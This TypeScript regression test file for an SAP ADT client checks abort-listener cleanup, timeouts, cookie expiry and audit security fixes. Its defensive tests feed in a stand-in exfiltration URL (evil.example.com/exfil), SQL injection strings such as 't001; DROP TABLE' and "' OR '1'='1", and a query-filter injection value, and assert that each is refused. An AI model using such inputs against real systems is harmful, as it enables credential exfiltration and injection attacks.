import { test } from 'node:test';
import assert from 'node:assert/strict';
import { getEventListeners } from 'node:events';
import { AdtClient, AdtError } from '../lib/index.js';

/**
 * Client transport-level regressions (request() lifecycle): the caller's
 * AbortSignal is a long-lived DSH session signal — one request must not
 * leave listeners (or their closures) behind on it. Plus credential-safety
 * and SQL-interpolation regressions from the audit (M1/M3/M7).
 */

const destination = {
  name: 'test',
  url: 'https://sap.example.com:44300/',
  client: '110',
  language: 'EN',
  auth: { type: 'basic' as const, username: 'ABAP04', password: 'pw' },
  strictSSL: true,
};

const abortError = (): Error => Object.assign(new Error('This operation was aborted'), { name: 'AbortError' });

/**
 * fetch stand-in that behaves like undici for our purposes: rejects on an
 * (already-)aborted init signal and resolves successfully after a short
 * in-flight window otherwise.
 */
function signalAwareFetch(): typeof fetch {
  return ((_url: string | URL, init?: RequestInit) =>
    new Promise<Response>((resolve, reject) => {
      const signal = init?.signal;
      if (signal?.aborted) {
        reject(abortError());
        return;
      }
      signal?.addEventListener('abort', () => reject(abortError()), { once: true });
      setTimeout(() => {
        if (signal?.aborted) reject(abortError());
        else resolve(new Response('<ok/>', { status: 200, headers: { 'content-type': 'application/xml' } }));
      }, 5);
    })) as unknown as typeof fetch;
}

test('request(): caller-signal abort listeners do not accumulate on the success path (H3)', async () => {
  const client = new AdtClient(destination, signalAwareFetch());
  const controller = new AbortController();
  const signal = controller.signal;
  const abortListeners = (): number => getEventListeners(signal, 'abort').length;

  const before = abortListeners();
  // Well past Node's ~10-listener AbortSignal leak warning threshold: every
  // request must clean up after itself once the fetch settles.
  for (let i = 0; i < 25; i++) {
    const res = await client.request({ path: '/sap/bc/adt/foo', signal });
    assert.equal(res.status, 200);
  }
  assert.equal(abortListeners(), before, 'abort listeners leaked onto the caller signal');
});

test('request(): caller signal still aborts an in-flight request', async () => {
  const client = new AdtClient(destination, signalAwareFetch());
  const controller = new AbortController();
  const pending = client.request({ path: '/sap/bc/adt/foo', signal: controller.signal });
  controller.abort(new Error('session cancelled'));
  await assert.rejects(pending, /aborted/);
  assert.equal(getEventListeners(controller.signal, 'abort').length, 0, 'listener fired once and was removed');
});

test('request(): a pre-aborted signal rejects without registering any listener', async () => {
  const client = new AdtClient(destination, signalAwareFetch());
  const controller = new AbortController();
  controller.abort(new Error('already gone'));
  await assert.rejects(
    () => client.request({ path: '/sap/bc/adt/foo', signal: controller.signal }),
    (error: unknown) => {
      assert.match((error as Error).message, /aborted|fetch failed/i);
      return true;
    },
  );
  assert.equal(getEventListeners(controller.signal, 'abort').length, 0);
});

/** fetch stand-in that records every URL it serves and answers via handler. */
function recordingFetch(handler: (url: string) => Response): { fetch: typeof fetch; urls: string[] } {
  const urls: string[] = [];
  const fn = async (_url: string | URL): Promise<Response> => {
    const url = String(_url);
    urls.push(url);
    return handler(url);
  };
  return { fetch: fn as unknown as typeof fetch, urls };
}

const xml = (body: string, type = 'application/xml') =>
  new Response(body, { status: 200, headers: { 'content-type': type } });

test('request(): absolute URLs must be same-origin — credentials never leave the destination host (M1)', async () => {
  const { fetch, urls } = recordingFetch(() => xml('<ok/>'));
  const client = new AdtClient(destination, fetch);

  // Same-origin absolute URLs pass through untouched.
  const res = await client.request({ path: 'https://sap.example.com:44300/sap/bc/adt/foo' });
  assert.equal(res.status, 200);
  assert.equal(urls.at(-1), 'https://sap.example.com:44300/sap/bc/adt/foo');

  // Cross-origin URLs are rejected BEFORE any fetch — no Authorization
  // header, no session cookie, no request at all.
  await assert.rejects(
    () => client.request({ path: 'https://evil.example.com/exfil?user=ABAP04' }),
    (error: unknown) => {
      assert.ok(error instanceof AdtError);
      assert.match(error.message, /refusing to send credentials to https:\/\/evil\.example\.com/);
      return true;
    },
  );
  // A different port on the same host is a different origin too.
  await assert.rejects(() => client.request({ path: 'https://sap.example.com:44301/sap/bc/adt/foo' }), /refusing/);
  // Nothing but the same-origin call ever hit the wire.
  assert.equal(urls.filter((u) => !u.startsWith('https://sap.example.com:44300/')).length, 0);
});

test('dataPreview: the SQL fallback refuses entity names with non-DDIC characters (M3)', async () => {
  const { fetch } = recordingFetch(() => new Response('no such service', { status: 404 }));
  const client = new AdtClient(destination, fetch);

  await assert.rejects(
    () => client.dataPreview('t001; DROP TABLE', 'ddic'),
    (error: unknown) => {
      assert.ok(error instanceof AdtError);
      assert.match(error.message, /refusing to build a SQL fallback/);
      return true;
    },
  );
  await assert.rejects(() => client.dataPreview("t001' OR '1'='1", 'ddic'), /refusing to build a SQL fallback/);
  // A plain DDIC name does not trip the guard (it proceeds to the SQL route;
  // this stub 404s everything, so the expected error is the route failure).
  await assert.rejects(() => client.dataPreview('T001', 'ddic'), (error: unknown) => {
    assert.ok(error instanceof AdtError);
    assert.doesNotMatch(error.message, /refusing to build a SQL fallback/);
    return true;
  });
});

test('createObject: surfaces the CORRNR reported in the create response (M7)', async () => {
  // The POST flows through the CSRF probe first — serve a token there.
  const { fetch } = recordingFetch((url) => {
    if (url.includes('/core/discovery')) {
      return new Response('', { status: 200, headers: { 'x-csrf-token': 'tok' } });
    }
    return xml(
      `<adtcore:objectReference xmlns:adtcore="http://www.sap.com/adt/core" ` +
        `adtcore:uri="/sap/bc/adt/oo/classes/zcl_auto" adtcore:type="CLAS/OC" adtcore:name="ZCL_AUTO" ` +
        `adtcore:packageName="ZPACK_DEMO" adtcore:corrNr="D01K961234"/>`,
    );
  });
  const client = new AdtClient(destination, fetch);
  const result = await client.createObject({
    destination: 'test',
    type: 'CLAS/OC',
    name: 'ZCL_AUTO',
    description: 'x',
    packageName: 'ZPACK_DEMO',
  });
  assert.equal(result.success, true);
  assert.equal(result.transport, 'D01K961234');

  // Element spelling is recognized too; an explicit transport wins over it.
  const { fetch: fetch2 } = recordingFetch((url) => {
    if (url.includes('/core/discovery')) {
      return new Response('', { status: 200, headers: { 'x-csrf-token': 'tok' } });
    }
    return xml('<obj:created><transportNumber>S4HK900001</transportNumber></obj:created>');
  });
  const client2 = new AdtClient(destination, fetch2);
  const explicit = await client2.createObject({
    destination: 'test',
    type: 'CLAS/OC',
    name: 'ZCL_AUTO',
    description: 'x',
    packageName: 'ZPACK_DEMO',
    transport: 'S4HK900009',
  });
  assert.equal(explicit.transport, 'S4HK900009');
});

test('request(): the timeout window covers the response BODY, not only the headers (M8)', async () => {
  // Headers arrive instantly; the body never settles. It must reject once
  // the (short) timeout elapses — not hang on undici's 300 s bodyTimeout.
  const hangingBodyFetch = (async (_url: string | URL, init?: RequestInit) => {
    const signal = init?.signal;
    const text = new Promise<string>((_resolve, reject) => {
      const onAbort = () => reject(abortError());
      if (signal?.aborted) reject(abortError());
      else signal?.addEventListener('abort', onAbort, { once: true });
    });
    return {
      status: 200,
      ok: true,
      headers: new Headers({ 'content-type': 'application/xml' }),
      text: () => text,
    } as unknown as Response;
  }) as unknown as typeof fetch;
  const client = new AdtClient(destination, hangingBodyFetch);
  await assert.rejects(
    () => client.request({ path: '/sap/bc/adt/foo', timeoutMs: 40 }),
    (error: unknown) => {
      assert.ok(error instanceof AdtError, `expected AdtError, got ${error}`);
      assert.match((error as Error).message, /timed out after 40 ms/);
      assert.match((error as Error).message, /response body/);
      return true;
    },
  );
});

test('patchStructureXml: property/label keys are matched literally, never as patterns (M4)', async () => {
  const { patchStructureXml } = await import('../lib/structure.js');
  const dtel = `<?xml version="1.0"?><dtel:dataElement xmlns:dtel="http://www.sap.com/adt/dtel" dtel:description="d">
  <dtel:shortText>keep me</dtel:shortText>
</dtel:dataElement>`;

  // Pre-fix, `sho.rtText` acted as a REGEX (`.` matches any char) and
  // silently patched the WRONG element (shortText) — the exact audit
  // scenario. Now the key is literal: it matches nothing.
  const dotted = patchStructureXml(dtel, 'DTEL', { properties: { 'sho.rtText': 'HACKED' } });
  assert.match(dotted, /<dtel:shortText>keep me<\/dtel:shortText>/, 'existing element untouched');

  // Pre-fix, an unbalanced `(` threw a SyntaxError from RegExp construction.
  const paren = patchStructureXml(dtel, 'DTEL', { properties: { 'sho(rtText': 'X' } });
  assert.match(paren, /<dtel:shortText>keep me<\/dtel:shortText>/, 'no throw, no mispatch');

  // Sanity: the legitimate key still patches — with a SINGLE colon (the
  // prefix group already carries its colon; appending another produced
  // <doma::length>, silently corrupting the XML sent to the backend —
  // adjacent bug found and fixed with audit M4).
  const legit = patchStructureXml(dtel, 'DTEL', { properties: { shortText: 'new text' } });
  assert.match(legit, /<dtel:shortText>new text<\/dtel:shortText>/);
  assert.doesNotMatch(legit, /::/);

  // Label types get the same treatment (they were XML-escaped, not
  // regex-escaped, before entering the RegExp source).
  const labeled = `<?xml version="1.0"?><dtel:dataElement xmlns:dtel="http://www.sap.com/adt/dtel">
  <dtel:labels><dtel:label type="shortText">short</dtel:label></dtel:labels>
</dtel:dataElement>`;
  const dottedLabel = patchStructureXml(labeled, 'DTEL', { labels: { 'sho.rtText': 'INJECTED' } });
  assert.match(dottedLabel, /<dtel:label type="shortText">short<\/dtel:label>/, 'existing label untouched');
  const okLabel = patchStructureXml(labeled, 'DTEL', { labels: { shortText: 'replaced' } });
  assert.match(okLabel, /<dtel:label type="shortText">replaced<\/dtel:label>/);
  assert.doesNotMatch(okLabel, /::/);
});

test('P3: MSAG patches never leave stale deletedmessages blocks behind', async () => {
  const { patchStructureXml, parseStructure } = await import('../lib/structure.js');
  const seed = `<?xml version="1.0"?><mc:messageClass xmlns:mc="http://www.sap.com/adt/MessageClass" adtcore:description="d" xmlns:adtcore="http://www.sap.com/adt/core">
  <mc:messages mc:msgno="001" mc:msgtext="one"/>
  <mc:messages mc:msgno="002" mc:msgtext="two"/>
</mc:messageClass>`;
  // Round 1: drop 002 → a deletedmessages block for 002 appears.
  const round1 = patchStructureXml(seed, 'MSAG', { messages: [{ number: '001', text: 'one' }] });
  assert.match(round1, /mc:deletedmessages mc:msgno="002"/);
  // Round 2 (on the ROUND-1 XML, like the backend echo): keep 001+002 —
  // the stale 002-deletion must be gone (previously it survived and
  // contradicted the kept block; audit P3).
  const round2 = patchStructureXml(round1, 'MSAG', {
    messages: [
      { number: '001', text: 'one' },
      { number: '002', text: 'two again' },
    ],
  });
  assert.doesNotMatch(round2, /mc:deletedmessages mc:msgno="002"/, 'stale deletion removed');
  const parsed = parseStructure(round2, 'MSAG') as { messages: Array<{ number: string }> };
  assert.deepEqual(parsed.messages.map((m) => m.number), ['001', '002']);
});

test('P3: constructor rejects non-http(s) destination URLs up front', () => {
  assert.throws(
    () => new AdtClient({ name: 'bad', url: 'ftp://sap.example.com' } as never),
    (error: unknown) => {
      assert.ok(error instanceof AdtError);
      assert.match(error.message, /not a valid http\(s\) URL/);
      return true;
    },
  );
  assert.throws(() => new AdtClient({ name: 'bad', url: 'gibberish' } as never), /not a valid http\(s\) URL/);
});

test('P3: writeSource merges an existing query instead of producing "?…?…"', async () => {
  const { fetch, urls } = recordingFetch((url) => {
    if (url.includes('/core/discovery')) {
      return new Response('', { status: 200, headers: { 'x-csrf-token': 'tok' } });
    }
    return xml('<ok/>');
  });
  const client = new AdtClient(destination, fetch);
  await client.writeSource('/sap/bc/adt/oo/classes/zcl_x?foo=1', 'src', { lockHandle: 'h1' });
  const target = urls.find((u) => u.includes('/source/main'));
  assert.ok(target, `no source/main URL in ${urls.join(', ')}`);
  assert.equal(target.split('?').length, 2, 'exactly one "?" in the request URL');
  assert.match(target, /foo=1/);
  assert.match(target, /lockHandle=h1/);
});

test('P3: readSource no longer turns a 404 into empty-source success via the bare-URI fallback', async () => {
  // /source/main answers 404; the bare object URI answers 200 with object
  // METADATA (XML without a code node) — that must fail, not "succeed" empty.
  const { fetch } = recordingFetch((url) => {
    if (url.includes('/source/main')) return new Response('not found', { status: 404 });
    return xml('<adtcore:objectReference xmlns:adtcore="http://www.sap.com/adt/core" adtcore:name="X"/>');
  });
  const client = new AdtClient(destination, fetch);
  await assert.rejects(() => client.readSource('/sap/bc/adt/oo/classes/zcl_ghost'), (error: unknown) => {
    assert.ok(error instanceof AdtError);
    assert.match(error.message, /not a source representation|HTTP 404/);
    return true;
  });
});

test('P3: $batch accepts a quoted multipart boundary', async () => {
  const { fetch } = recordingFetch((url) => {
    if (url.includes('/core/discovery')) {
      return new Response('', { status: 200, headers: { 'x-csrf-token': 'tok' } });
    }
    const body =
      '--batch_xyz\r\nContent-Type: application/http\r\ncontent-transfer-encoding: binary\r\n\r\n' +
      'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nhello\r\n--batch_xyz--\r\n';
    return new Response(body, {
      status: 200,
      headers: { 'content-type': 'multipart/mixed; boundary="batch_xyz"' },
    });
  });
  const client = new AdtClient(destination, fetch);
  const parts = await client.batch([{ method: 'GET', path: '/sap/bc/adt/foo' }]);
  assert.equal(parts.length, 1);
  assert.equal(parts[0]!.status, 200);
  assert.equal(parts[0]!.body, 'hello');
});

test('P3: session cookies honor Max-Age instead of replaying expired ones', async () => {
  const seen: Array<Record<string, string> | undefined> = [];
  let call = 0;
  const fetchStub = (async (_url: string | URL, init?: RequestInit) => {
    seen.push(init?.headers as Record<string, string> | undefined);
    call++;
    if (call === 1) {
      return new Response('<ok/>', {
        status: 200,
        headers: { 'content-type': 'application/xml', 'set-cookie': 'sap-session=abc; Max-Age=0; Path=/' },
      });
    }
    return xml('<ok/>');
  }) as unknown as typeof fetch;
  const client = new AdtClient(destination, fetchStub);
  await client.request({ path: '/sap/bc/adt/one' });
  await client.request({ path: '/sap/bc/adt/two' });
  assert.equal(seen[1]?.Cookie, undefined, 'expired cookie must not be replayed');
});

test('P3: listDumps user filter is whitelisted — predicate metacharacters cannot enter the $query', async () => {
  const client = new AdtClient(destination, recordingFetch(() => xml('<feed/>')).fetch);
  await assert.rejects(
    () => client.listDumps({ user: 'X) or equals( user, Y' }),
    (error: unknown) => {
      assert.ok(error instanceof AdtError);
      assert.match(error.message, /refusing to build a dumps \$query filter/);
      return true;
    },
  );
  await assert.rejects(() => client.listDumps({ user: 'A,B' }), /refusing to build a dumps \$query filter/);
  await assert.rejects(() => client.listDumps({ user: "'DEMO'" }), /refusing to build a dumps \$query filter/);
  // A plain SAP username still builds the field-verified unquoted filter.
  const { fetch, urls } = recordingFetch(() => xml('<?xml version="1.0"?><feed xmlns="http://www.w3.org/2005/Atom"></feed>'));
  const c2 = new AdtClient(destination, fetch);
  await c2.listDumps({ user: 'DEMO' });
  assert.match(
    decodeURIComponent(urls.at(-1) ?? ''),
    /\$query=and\( equals\( user, DEMO \) \)/,
  );
});

test('P3: a global activation error no longer marks healthy objects ERROR', async () => {
  // One object failed (own E message, no status); the other activated fine
  // (explicit ACTIVATED status) while a GLOBAL E message is also present —
  // the healthy object must stay ACTIVATED/severity S (audit P3).
  const { fetch } = recordingFetch((url) => {
    if (url.includes('/core/discovery')) {
      return new Response('', { status: 200, headers: { 'x-csrf-token': 'tok' } });
    }
    return xml(`<?xml version="1.0"?>
<adtcore:objectReferences xmlns:adtcore="http://www.sap.com/adt/core" xmlns:chkl="http://www.sap.com/adt/checkresult">
  <adtcore:objectReference adtcore:uri="/bad" adtcore:name="Z_BAD">
    <chkl:messages><chkl:msg type="E"><chkl:shortText><chkl:txt>Syntax error</chkl:txt></chkl:shortText></chkl:msg></chkl:messages>
  </adtcore:objectReference>
  <adtcore:objectReference adtcore:uri="/good" adtcore:name="Z_GOOD" adtcore:status="ACTIVATED"/>
</adtcore:objectReferences>
<chkl:messages><chkl:msg type="E"><chkl:shortText><chkl:txt>Activation failed for one or more objects</chkl:txt></chkl:shortText></chkl:msg></chkl:messages>`);
  });
  const client = new AdtClient(destination, fetch);
  const result = await client.activate([
    { uri: '/bad', type: 'PROG/P', name: 'Z_BAD' },
    { uri: '/good', type: 'PROG/P', name: 'Z_GOOD' },
  ]);
  assert.equal(result.success, false);
  const bad = result.items.find((i) => i.name === 'Z_BAD')!;
  const good = result.items.find((i) => i.name === 'Z_GOOD')!;
  assert.equal(bad.status, 'ERROR');
  assert.equal(good.status, 'ACTIVATED', 'explicit per-object status is authoritative');
  assert.equal(good.severity, 'S', 'a global E message must not taint healthy objects');
});
